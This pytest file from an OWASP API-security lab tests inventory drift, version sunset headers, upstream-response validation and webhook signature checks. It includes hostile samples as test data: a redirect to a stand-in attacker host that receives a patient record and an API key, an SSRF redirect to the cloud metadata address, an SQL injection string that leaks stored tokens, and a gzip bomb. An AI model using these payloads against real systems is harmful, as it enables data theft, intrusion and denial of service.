"""Lab: API9:2023 inventory drift and API10:2023 unsafe consumption of upstream APIs."""

from __future__ import annotations

import asyncio
import gzip
import json
import sqlite3
from datetime import UTC, datetime
from typing import TYPE_CHECKING

import httpx
import pydantic_core
import pytest
from fastapi import FastAPI
from fastapi.routing import APIRoute
from pydantic import BaseModel, ConfigDict, ValidationError

from api_labs.f15_api_authorization_and_owasp_security.upstream_trust import (
    ApiVersion,
    EnrichedAddress,
    LifecycleMiddleware,
    Operation,
    PartnerPrice,
    UpstreamError,
    UpstreamFailure,
    UpstreamPolicy,
    WebhookRejected,
    WebhookVerifier,
    build_quote_app,
    build_shadow_app,
    fetch_naive,
    fetch_validated,
    inventory_drift,
    naive_total,
    served_operations,
    sign_webhook,
    store_address_naive,
    store_address_safe,
)

if TYPE_CHECKING:
    from collections.abc import AsyncIterator, Callable

PARTNER = "https://pricing.partner.example"
POLICY = UpstreamPolicy(allowed_hosts=frozenset({"pricing.partner.example"}))
PRICE_URL = f"{PARTNER}/v1/prices/SKU-1"


def _client(handler: Callable[[httpx.Request], httpx.Response]) -> httpx.AsyncClient:
    return httpx.AsyncClient(transport=httpx.MockTransport(handler))


def _json(body: bytes, **headers: str) -> Callable[[httpx.Request], httpx.Response]:
    def handler(request: httpx.Request) -> httpx.Response:
        return httpx.Response(
            200, headers={"content-type": "application/json", **headers}, content=body
        )

    return handler


async def _failure(handler: Callable[[httpx.Request], httpx.Response]) -> UpstreamFailure:
    async with _client(handler) as client:
        with pytest.raises(UpstreamError) as caught:
            await fetch_validated(client, PRICE_URL, PartnerPrice, POLICY)
    return caught.value.failure


# --- API9: inventory ---------------------------------------------------------


@pytest.mark.unit
def test_naive_route_scan_misses_included_routers_in_fastapi_0_162() -> None:
    from fastapi import APIRouter

    app = FastAPI()
    router = APIRouter(prefix="/v2")

    @router.get("/orders/{order_id}")
    async def get_order(order_id: int) -> dict[str, int]:
        return {"id": order_id}

    app.include_router(router)
    naive = {r.path for r in app.routes if isinstance(r, APIRoute)}
    assert naive == set()  # app.routes holds a private _IncludedRouter, not APIRoute objects
    assert Operation("GET", "/v2/orders/{order_id}") in served_operations(app.routes)


@pytest.mark.unit
def test_drift_finds_hidden_route_and_mounted_legacy_app_with_its_own_docs() -> None:
    drift = inventory_drift(build_shadow_app())
    assert sorted(drift.undocumented) == [
        Operation("GET", "/docs"),
        Operation("GET", "/docs/oauth2-redirect"),
        Operation("GET", "/openapi.json"),
        Operation("GET", "/redoc"),
        Operation("GET", "/v1/docs"),
        Operation("GET", "/v1/docs/oauth2-redirect"),
        Operation("GET", "/v1/openapi.json"),
        Operation("GET", "/v1/orders/{order_id}"),
        Operation("GET", "/v1/redoc"),
        Operation("GET", "/v2/debug/config"),
    ]
    assert drift.phantom == frozenset()


@pytest.mark.unit
@pytest.mark.asyncio
async def test_hidden_and_mounted_routes_are_reachable_despite_absent_from_spec() -> None:
    app = build_shadow_app()
    assert set(app.openapi()["paths"]) == {"/v2/orders/{order_id}"}
    transport = httpx.ASGITransport(app=app)
    async with httpx.AsyncClient(transport=transport, base_url="http://test") as client:
        debug = await client.get("/v2/debug/config")
        legacy = await client.get("/v1/orders/1%20OR%201=1")
        legacy_spec = await client.get("/v1/openapi.json")
    assert debug.status_code == 200
    assert legacy.json() == {"id": "1 OR 1=1"}
    assert "/orders/{order_id}" in legacy_spec.json()["paths"]


@pytest.mark.unit
def test_phantom_operation_detected_when_spec_outlives_route() -> None:
    app = build_shadow_app()
    spec = app.openapi()
    spec["paths"]["/v2/refunds"] = {"post": {"responses": {}}}
    app.openapi_schema = spec
    assert inventory_drift(app).phantom == frozenset({Operation("POST", "/v2/refunds")})


DEPRECATED = datetime(2026, 6, 30, 23, 59, 59, tzinfo=UTC)
SUNSET = datetime(2026, 12, 31, 23, 59, 59, tzinfo=UTC)
V1 = ApiVersion("/v1", "https://developer.example/v1-retirement", DEPRECATED, SUNSET)


async def _lifecycle_get(now: datetime, path: str) -> httpx.Response:
    app = LifecycleMiddleware(build_shadow_app(), [V1], clock=lambda: now)
    transport = httpx.ASGITransport(app=app)
    async with httpx.AsyncClient(transport=transport, base_url="http://test") as client:
        return await client.get(path)


@pytest.mark.unit
@pytest.mark.asyncio
async def test_deprecated_version_carries_rfc9745_and_rfc8594_headers() -> None:
    response = await _lifecycle_get(datetime(2026, 11, 15, tzinfo=UTC), "/v1/orders/7")
    assert response.status_code == 200
    assert response.headers["deprecation"] == "@1782863999"
    assert response.headers["sunset"] == "Thu, 31 Dec 2026 23:59:59 GMT"
    assert response.headers.get_list("link") == [
        '<https://developer.example/v1-retirement>; rel="deprecation"',
        '<https://developer.example/v1-retirement>; rel="sunset"',
    ]
    current = await _lifecycle_get(datetime(2026, 11, 15, tzinfo=UTC), "/v2/orders/7")
    assert "deprecation" not in current.headers
    assert "sunset" not in current.headers


@pytest.mark.unit
@pytest.mark.asyncio
async def test_sunset_version_answers_410_problem_json() -> None:
    response = await _lifecycle_get(datetime(2027, 1, 1, tzinfo=UTC), "/v1/orders/7")
    assert response.status_code == 410
    assert response.headers["content-type"] == "application/problem+json"
    assert response.json()["detail"] == "/v1 is retired"
    prefix_lookalike = await _lifecycle_get(datetime(2027, 1, 1, tzinfo=UTC), "/v10/x")
    assert prefix_lookalike.status_code == 404


@pytest.mark.unit
def test_sunset_before_deprecation_is_rejected() -> None:
    with pytest.raises(ValueError, match="MUST NOT precede"):
        ApiVersion("/v0", "https://developer.example/", SUNSET, DEPRECATED)


# --- API10: unsafe consumption ---------------------------------------------------

GOOD_PRICE = b'{"sku": "SKU-1", "unit_price_cents": 250, "currency": "USD"}'


@pytest.mark.unit
@pytest.mark.asyncio
async def test_valid_upstream_response_parses_and_drops_unknown_fields() -> None:
    body = b'{"sku": "SKU-1", "unit_price_cents": 250, "currency": "USD", "is_admin": true}'
    async with _client(_json(body)) as client:
        price = await fetch_validated(client, PRICE_URL, PartnerPrice, POLICY)
    assert price.model_dump() == {"sku": "SKU-1", "unit_price_cents": 250, "currency": "USD"}


@pytest.mark.unit
@pytest.mark.asyncio
async def test_naive_consumer_silently_multiplies_a_string_price() -> None:
    body = b'{"sku": "SKU-1", "unit_price_cents": "250", "currency": "USD"}'
    async with _client(_json(body)) as client:
        raw = await fetch_naive(client, PRICE_URL)
    assert naive_total(raw, 3) == "250250250"  # no exception, wrong answer
    assert await _failure(_json(body)) is UpstreamFailure.SCHEMA


@pytest.mark.unit
@pytest.mark.asyncio
async def test_naive_consumer_crashes_on_null_and_quote_app_maps_it_to_502() -> None:
    body = b'{"sku": "SKU-1", "unit_price_cents": null, "currency": "USD"}'
    with pytest.raises(TypeError):
        naive_total(json.loads(body), 3)
    async with _client(_json(body)) as upstream:
        app = build_quote_app(upstream, POLICY, PARTNER)
        transport = httpx.ASGITransport(app=app)
        async with httpx.AsyncClient(transport=transport, base_url="http://test") as client:
            response = await client.get("/quotes/SKU-1", params={"qty": 3})
    assert response.status_code == 502
    assert response.headers["content-type"] == "application/problem+json"
    assert response.json()["detail"] == "schema"


@pytest.mark.unit
@pytest.mark.asyncio
async def test_quote_app_rejects_upstream_answer_for_a_different_sku() -> None:
    body = b'{"sku": "SKU-9", "unit_price_cents": 1, "currency": "USD"}'
    async with _client(_json(body)) as upstream:
        transport = httpx.ASGITransport(app=build_quote_app(upstream, POLICY, PARTNER))
        async with httpx.AsyncClient(transport=transport, base_url="http://test") as client:
            bad = await client.get("/quotes/SKU-1", params={"qty": 2})
    async with _client(_json(GOOD_PRICE)) as upstream:
        transport = httpx.ASGITransport(app=build_quote_app(upstream, POLICY, PARTNER))
        async with httpx.AsyncClient(transport=transport, base_url="http://test") as client:
            good = await client.get("/quotes/SKU-1", params={"qty": 2})
    assert (bad.status_code, bad.json()["detail"]) == (502, "identity_mismatch")
    assert good.json() == {"sku": "SKU-1", "currency": "USD", "total_cents": 500}


@pytest.mark.unit
@pytest.mark.asyncio
async def test_httpx_308_replays_body_and_custom_key_cross_origin_but_strips_authorization() -> (
    None
):
    seen: list[httpx.Request] = []

    def handler(request: httpx.Request) -> httpx.Response:
        seen.append(request)
        if request.url.host == "records.partner.example":
            return httpx.Response(308, headers={"location": "https://attacker.example/collect"})
        return httpx.Response(204)

    async with _client(handler) as client:
        await client.post(
            "https://records.partner.example/v1/records",
            json={"patient": "P-1", "diagnosis": "E11.9"},
            headers={"authorization": "Bearer EXAMPLE-NOT-A-REAL-TOKEN", "x-api-key": "k-EXAMPLE"},
            follow_redirects=True,
        )
    leaked = seen[1]
    assert (leaked.url.host, leaked.method) == ("attacker.example", "POST")
    assert json.loads(leaked.content) == {"patient": "P-1", "diagnosis": "E11.9"}
    assert leaked.headers["x-api-key"] == "k-EXAMPLE"
    assert "authorization" not in leaked.headers


@pytest.mark.unit
@pytest.mark.asyncio
async def test_choke_point_refuses_redirects_and_never_contacts_location() -> None:
    contacted: list[str] = []

    def handler(request: httpx.Request) -> httpx.Response:
        contacted.append(request.url.host)
        return httpx.Response(302, headers={"location": "http://169.254.169.254/latest/"})

    assert await _failure(handler) is UpstreamFailure.REDIRECT_REFUSED
    assert contacted == ["pricing.partner.example"]


@pytest.mark.unit
@pytest.mark.asyncio
async def test_scheme_and_host_allowlist_checked_before_any_request() -> None:
    def handler(request: httpx.Request) -> httpx.Response:
        raise AssertionError("must not be called")

    async with _client(handler) as client:
        for url, failure in [
            ("http://pricing.partner.example/v1/prices/SKU-1", UpstreamFailure.INSECURE_URL),
            ("https://pricing.partner.example.evil/x", UpstreamFailure.HOST_NOT_ALLOWED),
        ]:
            with pytest.raises(UpstreamError) as caught:
                await fetch_validated(client, url, PartnerPrice, POLICY)
            assert caught.value.failure is failure


@pytest.mark.unit
@pytest.mark.asyncio
async def test_gzip_bomb_passes_content_length_check_but_hits_decoded_cap() -> None:
    inflated = b'{"pad": "' + b"A" * (8 * 1024 * 1024) + b'"}'
    bomb = gzip.compress(inflated, compresslevel=9)
    handler = _json(bomb, **{"content-encoding": "gzip"})
    assert len(bomb) < POLICY.max_body_bytes < len(inflated)
    async with _client(handler) as client:
        naive = await fetch_naive(client, PRICE_URL)
    assert len(naive["pad"]) == 8 * 1024 * 1024  # naive client materialised all 8 MiB
    assert await _failure(handler) is UpstreamFailure.TOO_LARGE
    print(f"\ngzip bomb: {len(bomb)} bytes on the wire -> {len(inflated)} decoded")


@pytest.mark.unit
@pytest.mark.asyncio
async def test_declared_oversize_content_length_rejected_before_reading_body() -> None:
    assert await _failure(_json(b"{}" + b" " * (70 * 1024))) is UpstreamFailure.TOO_LARGE


@pytest.mark.unit
@pytest.mark.asyncio
async def test_total_deadline_stops_a_trickling_upstream() -> None:
    async def trickle() -> AsyncIterator[bytes]:
        yield b'{"sku": "SKU-1",'
        while True:  # each chunk arrives well inside any per-read timeout
            await asyncio.sleep(0.02)
            yield b" "

    def handler(request: httpx.Request) -> httpx.Response:
        return httpx.Response(200, headers={"content-type": "application/json"}, content=trickle())

    policy = UpstreamPolicy(allowed_hosts=POLICY.allowed_hosts, deadline_seconds=0.2)
    async with _client(handler) as client:
        with pytest.raises(UpstreamError) as caught:
            await fetch_validated(client, PRICE_URL, PartnerPrice, policy)
    assert caught.value.failure is UpstreamFailure.DEADLINE


@pytest.mark.unit
@pytest.mark.asyncio
async def test_wrong_status_and_content_type_rejected() -> None:
    def html(request: httpx.Request) -> httpx.Response:
        return httpx.Response(200, headers={"content-type": "text/html"}, content=b"<h1>hi</h1>")

    def outage(request: httpx.Request) -> httpx.Response:
        return httpx.Response(503, json={"error": "maintenance"})

    assert await _failure(html) is UpstreamFailure.BAD_CONTENT_TYPE
    assert await _failure(outage) is UpstreamFailure.BAD_STATUS
    vendor = b'{"sku": "SKU-1", "unit_price_cents": 1, "currency": "USD"}'
    async with _client(_json(vendor, **{"content-type": "application/vnd.p+json"})) as client:
        assert (await fetch_validated(client, PRICE_URL, PartnerPrice, POLICY)).sku == "SKU-1"


@pytest.mark.unit
@pytest.mark.asyncio
async def test_duplicate_keys_pydantic_takes_last_value_choke_point_rejects() -> None:
    body = b'{"sku": "SKU-1", "unit_price_cents": 250, "currency": "USD", "unit_price_cents": 1}'
    assert PartnerPrice.model_validate_json(body).unit_price_cents == 1
    assert await _failure(_json(body)) is UpstreamFailure.DUPLICATE_KEY


@pytest.mark.unit
@pytest.mark.asyncio
async def test_nan_and_deep_nesting_rejected_as_malformed() -> None:
    nan = b'{"sku": "SKU-1", "unit_price_cents": 1, "currency": "USD", "x": NaN}'
    deep = b'{"sku": "SKU-1", "unit_price_cents": 1, "currency": "USD", "x": '
    deep += b"[" * 5000 + b"]" * 5000 + b"}"
    assert await _failure(_json(nan)) is UpstreamFailure.MALFORMED_JSON
    assert await _failure(_json(deep)) is UpstreamFailure.MALFORMED_JSON


@pytest.mark.unit
def test_parser_facts_pinned_pydantic_core_2_50_4() -> None:
    class Rate(BaseModel):
        rate: float

    class FiniteRate(BaseModel):
        model_config = ConfigDict(allow_inf_nan=False)
        rate: float

    assert str(Rate.model_validate_json('{"rate": NaN}').rate) == "nan"
    with pytest.raises(ValidationError, match="finite_number"):
        FiniteRate.model_validate_json('{"rate": NaN}')
    pydantic_core.from_json("[" * 201 + "]" * 201)
    with pytest.raises(ValueError, match="recursion limit exceeded"):
        pydantic_core.from_json("[" * 202 + "]" * 202)


@pytest.mark.unit
def test_stored_injection_from_enrichment_data_validation_is_not_sanitization() -> None:
    conn = sqlite3.connect(":memory:")
    conn.execute("CREATE TABLE addresses (user_id INTEGER, street TEXT)")
    conn.execute("CREATE TABLE api_keys (token TEXT)")
    conn.execute("INSERT INTO api_keys VALUES ('tok-EXAMPLE-NOT-REAL')")
    payload = "x'), (666, (SELECT token FROM api_keys))--"
    street = EnrichedAddress.model_validate_json(json.dumps({"street": payload})).street
    store_address_naive(conn, 1, street)
    leaked = conn.execute("SELECT street FROM addresses WHERE user_id = 666").fetchall()
    assert leaked == [("tok-EXAMPLE-NOT-REAL",)]
    conn.execute("DELETE FROM addresses")
    store_address_safe(conn, 1, street)
    assert conn.execute("SELECT user_id, street FROM addresses").fetchall() == [(1, payload)]
    conn.close()


# --- Inbound webhooks (Standard Webhooks v1) -----------------------------------

KEY_OLD, KEY_NEW = b"k" * 32, b"n" * 32
BODY = b'{"type": "invoice.paid", "id": "inv_1"}'
NOW = 1_800_000_000


def _headers(
    key: bytes, msg_id: str = "msg_1", ts: int = NOW, body: bytes = BODY
) -> dict[str, str]:
    return {
        "webhook-id": msg_id,
        "webhook-timestamp": str(ts),
        "webhook-signature": sign_webhook(key, msg_id, ts, body),
    }


@pytest.mark.unit
def test_webhook_accepts_old_or_new_key_during_rotation() -> None:
    verifier = WebhookVerifier(keys=(KEY_OLD, KEY_NEW))
    verifier.verify(_headers(KEY_OLD, "msg_a"), BODY, NOW)
    both = _headers(KEY_NEW, "msg_b")
    both["webhook-signature"] = "v1,AAAA " + both["webhook-signature"]
    verifier.verify(both, BODY, NOW)


@pytest.mark.unit
def test_webhook_rejects_tampered_body_stale_timestamp_and_replay() -> None:
    verifier = WebhookVerifier(keys=(KEY_NEW,))
    with pytest.raises(WebhookRejected, match="no matching signature"):
        verifier.verify(_headers(KEY_NEW), BODY.replace(b"inv_1", b"inv_2"), NOW)
    with pytest.raises(WebhookRejected, match="no matching signature"):
        verifier.verify(_headers(KEY_OLD), BODY, NOW)
    with pytest.raises(WebhookRejected, match="tolerance"):
        verifier.verify(_headers(KEY_NEW, ts=NOW - 301), BODY, NOW)
    verifier.verify(_headers(KEY_NEW, ts=NOW - 300), BODY, NOW)
    with pytest.raises(WebhookRejected, match="replayed"):
        verifier.verify(_headers(KEY_NEW, ts=NOW - 300), BODY, NOW)
    with pytest.raises(WebhookRejected, match="malformed"):
        verifier.verify({"webhook-id": "m"}, BODY, NOW)
